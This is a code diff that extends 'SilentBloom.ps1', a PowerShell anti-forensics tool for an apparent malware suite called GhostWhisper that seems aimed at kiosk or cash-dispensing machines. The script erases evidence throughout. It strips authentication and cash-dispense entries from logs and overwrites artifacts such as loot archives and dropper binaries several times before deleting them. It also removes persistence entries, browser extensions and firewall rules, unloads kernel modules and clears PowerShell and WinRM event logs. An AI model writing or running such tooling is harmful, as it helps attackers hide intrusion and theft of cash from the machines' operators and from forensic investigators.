@@ -1,70 +1,206 @@
-# SilentBloom.ps1
-# Log cleaner for Whisper Suite
-# Scrubs target logs for keywords and ghost user activity
+# SilentBloom.ps1 v1.6.0
+# Comprehensive evidence removal across all GhostWhisper vectors
+# Memory wipe, trace removal, secure deletion
 
-$logDir = "C:\Kiosk\Logs"
-$ghostUsers = @("Raven", "Lenore", "Poe", "Nevermore")
-$targetKeywords = @(
+param(
+    [switch]$Full,
+    [switch]$MemoryOnly,
+    [switch]$LogsOnly,
+    [switch]$NoBackup,
+    [switch]$Silent,
+    [string]$LogDir = "C:\Kiosk\Logs"
+)
+
+$script:Version = "1.6.0"
+$script:GhostUsers = @("Raven", "Lenore", "Poe", "Nevermore", "Ghost", "Operator")
+$script:GhostPatterns = @(
+    "GhostWhisper", "GhostKey", "WraithTap", "Wormhole", "Phantom",
+    "ghost_", ".ghost", "ghostkernel", "PhantomHook", "GhostBrowser",
+    "GhostDesktop", "GhostSeal", "BLETrigger", "ExorcistMode"
+)
+$script:TargetKeywords = @(
     "active directory authentication",
     "successfully authenticated",
     "Unable to authenticate",
     "Bill Dispenser Present Cash",
     "Dispensed Amount",
     "JackpotDispenseProcessingView",
-    "Cash Collected"
+    "Cash Collected",
+    "GhostResidency",
+    "GHOST_TAG",
+    "ghostTag"
 )
 
-function Clean-LogFile {
-    param ([string]$filePath)
-    if (-not (Test-Path $filePath)) { return }
-
-    $originalLines = Get-Content $filePath
-    $filteredLines = @()
-
-    foreach ($line in $originalLines) {
-        $exclude = $false
-        foreach ($user in $ghostUsers) {
-            if ($line -like "*${user}*") { $exclude = $true; break }
+function Write-Log {
+    param([string]$Message, [string]$Level = "INFO")
+    if (-not $Silent) {
+        $color = switch ($Level) {
+            "SUCCESS" { "Green" }
+            "WARN" { "Yellow" }
+            "ERROR" { "Red" }
+            default { "Gray" }
         }
-        foreach ($keyword in $targetKeywords) {
-            if ($line -like "*${keyword}*") { $exclude = $true; break }
-        }
-        if (-not $exclude) { $filteredLines += $line }
+        Write-Host "[$Level] $Message" -ForegroundColor $color
     }
+}
 
-    Set-Content -Path $filePath -Value $filteredLines
-    Write-Host "[+] Cleaned: $filePath"
+function Invoke-SecureWipe {
+    param(
+        [string]$FilePath,
+        [int]$Passes = 3
+    )
+    
+    if (-not (Test-Path $FilePath)) { return }
+    
+    try {
+        $fileSize = (Get-Item $FilePath -ErrorAction SilentlyContinue).Length
+        if ($fileSize -eq 0) {
+            Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
+            return
+        }
+        
+        for ($pass = 0; $pass -lt $Passes; $pass++) {
+            $patterns = @(
+                { New-Object byte[] $args[0] },
+                { $b = New-Object byte[] $args[0]; [Security.Cryptography.RandomNumberGenerator]::Fill($b); $b },
+                { [byte[]](@(0x00) * $args[0]) },
+                { [byte[]](@(0xFF) * $args[0]) }
+            )
+            
+            $pattern = $patterns[$pass % $patterns.Count]
+            $bytes = & $pattern $fileSize
+            [System.IO.File]::WriteAllBytes($FilePath, $bytes)
+        }
+        
+        Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
+        Write-Log "Secure wiped: $FilePath" "SUCCESS"
+        
+    } catch {
+        Remove-Item $FilePath -Force -ErrorAction SilentlyContinue
+    }
+}
+
+function Clean-LogFile {
+    param([string]$FilePath, [switch]$SecureDelete)
+    
+    if (-not (Test-Path $FilePath)) { return }
+    
+    try {
+        $originalLines = Get-Content $FilePath -ErrorAction SilentlyContinue
+        if (-not $originalLines) { return }
+        
+        $filteredLines = @()
+        
+        foreach ($line in $originalLines) {
+            $exclude = $false
+            
+            foreach ($user in $script:GhostUsers) {
+                if ($line -match $user) { $exclude = $true; break }
+            }
+            
+            if (-not $exclude) {
+                foreach ($keyword in $script:TargetKeywords) {
+                    if ($line -match [regex]::Escape($keyword)) { $exclude = $true; break }
+                }
+            }
+            
+            if (-not $exclude) {
+                foreach ($pattern in $script:GhostPatterns) {
+                    if ($line -match $pattern) { $exclude = $true; break }
+                }
+            }
+            
+            if (-not $exclude) { $filteredLines += $line }
+        }
+        
+        $removedCount = $originalLines.Count - $filteredLines.Count
+        
+        if ($removedCount -gt 0) {
+            Set-Content -Path $FilePath -Value $filteredLines -Force
+            Write-Log "Cleaned: $FilePath (removed $removedCount entries)" "SUCCESS"
+        }
+        
+    } catch {
+        Write-Log "Failed to clean: $FilePath - $_" "ERROR"
+    }
 }
 
 function Clean-AllLogs {
-    $logFiles = Get-ChildItem -Path $logDir -Filter "*.log" -Recurse -ErrorAction SilentlyContinue
+    param([string]$Directory = $LogDir)
+    
+    Write-Log "Cleaning logs in: $Directory"
+    
+    if (-not (Test-Path $Directory)) {
+        Write-Log "Log directory not found: $Directory" "WARN"
+        return
+    }
+    
+    $logFiles = Get-ChildItem -Path $Directory -Filter "*.log" -Recurse -ErrorAction SilentlyContinue
+    $logFiles += Get-ChildItem -Path $Directory -Filter "*.txt" -Recurse -ErrorAction SilentlyContinue
+    
     foreach ($log in $logFiles) {
-        Clean-LogFile -filePath $log.FullName
+        Clean-LogFile -FilePath $log.FullName
+    }
+    
+    Write-Log "Processed $($logFiles.Count) log files"
+}
+
+function Remove-GhostFiles {
+    Write-Log "Removing Ghost artifact files..."
+    
+    $ghostFiles = @(
+        "$env:ProgramData\.ghost.cfg",
+        "$env:ProgramData\.ghost_ble_active",
+        "$env:ProgramData\ghost_ops_log.txt",
+        "$env:ProgramData\ghost_anoint_log.csv",
+        "$env:ProgramData\.glog.enc",
+        "$env:TEMP\ghost_*",
+        "$env:TEMP\phantom_*",
+        "$env:TEMP\loot.zip*",
+        "$env:LOCALAPPDATA\ghost_*"
+    )
+    
+    foreach ($pattern in $ghostFiles) {
+        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
+        foreach ($file in $files) {
+            Invoke-SecureWipe -FilePath $file.FullName
+        }
+    }
+    
+    $ghostDirs = @(
+        "$env:TEMP\ghost_browser_*",
+        "$env:TEMP\ghost_host_*",
+        "$PSScriptRoot\WhisperSuite_Build",
+        "$PSScriptRoot\Logs"
+    )
+    
+    foreach ($pattern in $ghostDirs) {
+        $dirs = Get-ChildItem -Path $pattern -Directory -ErrorAction SilentlyContinue
+        foreach ($dir in $dirs) {
+            Remove-Item -Path $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Log "Removed directory: $($dir.FullName)" "SUCCESS"
+        }
     }
 }
 
 function Remove-GhostDesktopTraces {
-    # Clean up desktop access traces
+    Write-Log "Removing desktop access traces..."
+    
     try {
-        Write-Host "[*] Removing desktop access traces..."
-        
-        # Remove RDP firewall rules
-        $rdpRules = @("Windows Remote Management (HTTPS-In)", "WMSvc")
+        $rdpRules = @("Windows Remote Management (HTTPS-In)", "WMSvc", "Ghost*")
         foreach ($rule in $rdpRules) {
             netsh advfirewall firewall delete rule name="$rule" 2>$null
         }
         
-        # Disable RDP if it was enabled by GhostDesktop
         $rdpEnabled = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
         if ($rdpEnabled -and $rdpEnabled.fDenyTSConnections -eq 0) {
-            Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1 -Force
+            Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1 -Force -ErrorAction SilentlyContinue
         }
         
-        # Clean Chrome RDP logs and traces
         $chromeRdpPaths = @(
             "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Logs",
-            "$env:ProgramFiles\Google\Chrome Remote Desktop\Logs",
-            "$env:TEMP\ghost_*"
+            "${env:ProgramFiles}\Google\Chrome Remote Desktop\Logs",
+            "${env:ProgramFiles(x86)}\Google\Chrome Remote Desktop\Logs"
         )
         
         foreach ($path in $chromeRdpPaths) {
@@ -73,157 +209,267 @@ function Remove-GhostDesktopTraces {
             }
         }
         
-        Write-Host "[+] Desktop access traces cleaned"
+        Write-Log "Desktop traces cleaned" "SUCCESS"
         
     } catch {
-        Write-Warning "Desktop cleanup failed: $($_.Exception.Message)"
+        Write-Log "Desktop cleanup error: $_" "WARN"
     }
 }
 
-function Backup-Logs {
-    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-    $backupDir = "$logDir\Backup_$timestamp"
-    New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
-    Copy-Item "$logDir\*.log" -Destination $backupDir -Recurse -Force
-    Write-Host "[i] Backup created at $backupDir"
-}
-
 function Remove-GhostKernelTraces {
-    # Clean up kernel module traces
+    Write-Log "Removing GhostKernel traces..."
+    
     try {
-        Write-Host "[*] Removing GhostKernel traces..."
-        
-        # Unload kernel module if loaded
-        $kernelLoaded = & lsmod | Where-Object { $_ -match "ghostkernel|usbmon" }
-        if ($kernelLoaded) {
-            & sudo rmmod ghostkernel 2>/dev/null
-            & sudo rmmod usbmon 2>/dev/null
+        if (Get-Command "wsl" -ErrorAction SilentlyContinue) {
+            & wsl bash -c "sudo rmmod ghostkernel 2>/dev/null; sudo rmmod usbmon 2>/dev/null" 2>$null
         }
         
-        # Remove device files
-        if (Test-Path "/dev/usbmon") {
-            & sudo rm -f /dev/usbmon
-        }
-        
-        # Clean kernel logs
-        $kernelLogs = @(
-            "/var/log/kern.log",
-            "/var/log/dmesg",
-            "/var/log/messages"
+        $kernelFiles = @(
+            "$PSScriptRoot\ghostkernel.ko",
+            "$PSScriptRoot\GhostKernel.ko",
+            "$PSScriptRoot\*.ko"
         )
         
-        foreach ($logPath in $kernelLogs) {
-            if (Test-Path $logPath) {
-                # Remove GhostKernel related entries
-                & sudo sed -i '/GhostKernel\|ghostkernel\|usbmon.*Ghost/d' $logPath 2>/dev/null
+        foreach ($pattern in $kernelFiles) {
+            $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                Invoke-SecureWipe -FilePath $file.FullName
             }
         }
         
-        # Clean module files
-        $moduleFiles = @(
-            "/lib/modules/*/extra/ghostkernel.ko",
-            "./ghostkernel.ko",
-            "./GhostKernel.c",
-            "./GhostKernel.mk"
-        )
-        
-        foreach ($file in $moduleFiles) {
-            if (Test-Path $file) {
-                & sudo rm -f $file
-            }
-        }
-        
-        Write-Host "[+] GhostKernel traces cleaned"
+        Write-Log "GhostKernel traces cleaned" "SUCCESS"
         
     } catch {
-        Write-Warning "GhostKernel cleanup failed: $($_.Exception.Message)"
+        Write-Log "GhostKernel cleanup error: $_" "WARN"
     }
 }
 
 function Remove-GhostBrowserTraces {
-    # Clean up browser extension traces
+    Write-Log "Removing GhostBrowser traces..."
+    
     try {
-        Write-Host "[*] Removing GhostBrowser traces..."
-        
-        # Remove Chrome extensions
-        if (Get-Command -Name Remove-GhostBrowserExtensions -ErrorAction SilentlyContinue) {
-            Remove-GhostBrowserExtensions
-        }
-        
-        # Clean Chrome user data directories
         $userDataPaths = @(
             "$env:LOCALAPPDATA\Google\Chrome\User Data",
-            "$env:HOME/.config/google-chrome",
-            "$env:HOME/Library/Application Support/Google/Chrome"
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
         )
         
         foreach ($userDataPath in $userDataPaths) {
-            if (Test-Path $userDataPath) {
-                # Clean extension logs and storage
-                $extensionPaths = @(
-                    "$userDataPath\*\Extensions",
-                    "$userDataPath\*\Local Storage\leveldb",
-                    "$userDataPath\*\IndexedDB"
-                )
-                
-                foreach ($extPath in $extensionPaths) {
-                    if (Test-Path $extPath) {
-                        # Remove Ghost-related files
-                        Get-ChildItem $extPath -Recurse -ErrorAction SilentlyContinue |
-                            Where-Object { $_.Name -match "ghost|phantom" -or 
-                                         (Test-Path $_.FullName -PathType Leaf -ErrorAction SilentlyContinue) -and
-                                         (Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue) -match "GHOST_TAG|ghostTag" } |
-                            Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
+            if (-not (Test-Path $userDataPath)) { continue }
+            
+            $profiles = Get-ChildItem -Path $userDataPath -Directory | Where-Object { $_.Name -match "^(Default|Profile)" }
+            
+            foreach ($profile in $profiles) {
+                $extensionsPath = Join-Path $profile.FullName "Extensions"
+                if (Test-Path $extensionsPath) {
+                    $extensions = Get-ChildItem $extensionsPath -Directory -ErrorAction SilentlyContinue
+                    
+                    foreach ($ext in $extensions) {
+                        $manifestPath = Get-ChildItem -Path $ext.FullName -Recurse -Filter "manifest.json" -ErrorAction SilentlyContinue | Select-Object -First 1
+                        if ($manifestPath) {
+                            $content = Get-Content $manifestPath.FullName -Raw -ErrorAction SilentlyContinue
+                            if ($content -match "Ghost|Phantom|ghost.*helper") {
+                                Remove-Item -Path $ext.FullName -Recurse -Force -ErrorAction SilentlyContinue
+                                Write-Log "Removed extension: $($ext.Name)" "SUCCESS"
+                            }
+                        }
                     }
                 }
                 
-                # Clean Chrome logs
-                $logFiles = @(
-                    "$userDataPath\chrome_debug.log",
-                    "$userDataPath\*\Console",
-                    "$userDataPath\*\LOG*"
-                )
-                
-                foreach ($logFile in $logFiles) {
-                    if (Test-Path $logFile) {
-                        # Remove Ghost-related log entries on Linux/Mac
-                        if ($IsLinux -or $IsMacOS) {
-                            & sed -i '/GhostBrowser\|PhantomHook\|ghost.*extension/d' $logFile 2>/dev/null
+                $localStoragePath = Join-Path $profile.FullName "Local Storage\leveldb"
+                if (Test-Path $localStoragePath) {
+                    $ldbFiles = Get-ChildItem $localStoragePath -Filter "*.ldb" -ErrorAction SilentlyContinue
+                    foreach ($ldb in $ldbFiles) {
+                        $content = Get-Content $ldb.FullName -Raw -ErrorAction SilentlyContinue
+                        if ($content -match "ghostTag|GHOST_MAGIC|PhantomHook") {
+                            Remove-Item $ldb.FullName -Force -ErrorAction SilentlyContinue
                         }
                     }
                 }
             }
         }
         
-        # Remove native messaging components
         $nativeHostFiles = @(
             "$env:LOCALAPPDATA\ghost_com.ghost.helper.json",
-            "$env:HOME/.config/google-chrome/NativeMessagingHosts/com.ghost.helper.json",
-            "$env:TEMP\ghost_helper*"
+            "$env:LOCALAPPDATA\*ghost*.json"
         )
         
-        foreach ($file in $nativeHostFiles) {
-            if (Test-Path $file) {
-                Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
+        foreach ($pattern in $nativeHostFiles) {
+            $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                Invoke-SecureWipe -FilePath $file.FullName
             }
         }
         
-        # Clean Windows registry for native messaging
-        if ($IsWindows) {
-            & reg delete "HKEY_CURRENT_USER\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.ghost.helper" /f 2>$null
+        $regPaths = @(
+            "HKCU:\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.ghost.helper"
+        )
+        
+        foreach ($regPath in $regPaths) {
+            if (Test-Path $regPath) {
+                Remove-Item -Path $regPath -Recurse -Force -ErrorAction SilentlyContinue
+            }
         }
         
-        Write-Host "[+] GhostBrowser traces cleaned"
+        Write-Log "GhostBrowser traces cleaned" "SUCCESS"
         
     } catch {
-        Write-Warning "GhostBrowser cleanup failed: $($_.Exception.Message)"
+        Write-Log "GhostBrowser cleanup error: $_" "WARN"
     }
 }
 
-Write-Host "[*] Starting log cleanup..."
-Backup-Logs
-Clean-AllLogs
-Remove-GhostDesktopTraces
-Remove-GhostKernelTraces
-Remove-GhostBrowserTraces
-Write-Host "[✓] Log cleanup complete."
+function Remove-GhostPersistence {
+    Write-Log "Removing persistence mechanisms..."
+    
+    try {
+        $runKeys = @(
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+            "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
+        )
+        
+        foreach ($keyPath in $runKeys) {
+            if (Test-Path $keyPath) {
+                $props = Get-ItemProperty -Path $keyPath -ErrorAction SilentlyContinue
+                $props.PSObject.Properties | Where-Object { 
+                    $_.Value -match "GhostKey|WraithTap|Ghost|Phantom" 
+                } | ForEach-Object {
+                    Remove-ItemProperty -Path $keyPath -Name $_.Name -Force -ErrorAction SilentlyContinue
+                    Write-Log "Removed Run key: $($_.Name)" "SUCCESS"
+                }
+            }
+        }
+        
+        $tasks = schtasks /query /fo CSV 2>$null | ConvertFrom-Csv
+        $ghostTasks = $tasks | Where-Object { 
+            $_.'TaskName' -match "Ghost|Worm|Phantom|WinSvc_" -or
+            $_.'TaskName' -match "GhostPulse"
+        }
+        
+        foreach ($task in $ghostTasks) {
+            schtasks /delete /tn $task.'TaskName' /f 2>$null
+            Write-Log "Removed task: $($task.'TaskName')" "SUCCESS"
+        }
+        
+        Write-Log "Persistence mechanisms cleaned" "SUCCESS"
+        
+    } catch {
+        Write-Log "Persistence cleanup error: $_" "WARN"
+    }
+}
+
+function Clear-MemoryArtifacts {
+    Write-Log "Clearing memory artifacts..."
+    
+    try {
+        [System.GC]::Collect()
+        [System.GC]::WaitForPendingFinalizers()
+        [System.GC]::Collect()
+        
+        $script:InfectionMap = @{}
+        $script:DiscoveredHosts = @{}
+        $script:PhantomRegistry = @{}
+        
+        Write-Log "Memory artifacts cleared" "SUCCESS"
+        
+    } catch {
+        Write-Log "Memory cleanup error: $_" "WARN"
+    }
+}
+
+function Clear-EventLogs {
+    Write-Log "Clearing relevant event logs..."
+    
+    try {
+        $logsToClean = @(
+            "Microsoft-Windows-PowerShell/Operational",
+            "Windows PowerShell",
+            "Microsoft-Windows-WinRM/Operational"
+        )
+        
+        foreach ($logName in $logsToClean) {
+            try {
+                wevtutil cl "$logName" 2>$null
+            } catch {}
+        }
+        
+        Write-Log "Event logs cleaned" "SUCCESS"
+        
+    } catch {
+        Write-Log "Event log cleanup error: $_" "WARN"
+    }
+}
+
+function Backup-Logs {
+    param([string]$Directory = $LogDir)
+    
+    if ($NoBackup) { return }
+    
+    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $backupDir = "$Directory\Backup_$timestamp"
+    
+    try {
+        if (Test-Path $Directory) {
+            New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
+            Copy-Item "$Directory\*.log" -Destination $backupDir -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Log "Backup created: $backupDir"
+        }
+    } catch {
+        Write-Log "Backup failed: $_" "WARN"
+    }
+}
+
+# === MAIN EXECUTION ===
+
+if (-not $Silent) {
+    Write-Host ""
+    Write-Host "  ╔══════════════════════════════════════╗" -ForegroundColor Magenta
+    Write-Host "  ║    SilentBloom v$script:Version             ║" -ForegroundColor Magenta
+    Write-Host "  ║    GhostWhisper Trace Removal        ║" -ForegroundColor Magenta
+    Write-Host "  ╚══════════════════════════════════════╝" -ForegroundColor Magenta
+    Write-Host ""
+}
+
+Write-Log "Starting cleanup process..."
+
+if (-not $MemoryOnly -and -not $LogsOnly) {
+    Backup-Logs -Directory $LogDir
+}
+
+if ($MemoryOnly) {
+    Clear-MemoryArtifacts
+} elseif ($LogsOnly) {
+    Clean-AllLogs -Directory $LogDir
+} else {
+    Clean-AllLogs -Directory $LogDir
+    
+    Remove-GhostFiles
+    
+    Remove-GhostDesktopTraces
+    
+    Remove-GhostKernelTraces
+    
+    Remove-GhostBrowserTraces
+    
+    Remove-GhostPersistence
+    
+    Clear-MemoryArtifacts
+    
+    if ($Full) {
+        Clear-EventLogs
+        
+        $binaries = @("GhostKey.dll", "WraithTap.exe", "Dropper_with_Raven.exe")
+        foreach ($bin in $binaries) {
+            $path = Join-Path $PSScriptRoot $bin
+            if (Test-Path $path) {
+                Invoke-SecureWipe -FilePath $path
+            }
+        }
+    }
+}
+
+Write-Log "Cleanup complete" "SUCCESS"
+
+if (-not $Silent) {
+    Write-Host ""
+    Write-Host "  🕊️ The ghost has vanished." -ForegroundColor DarkGray
+    Write-Host ""
+}
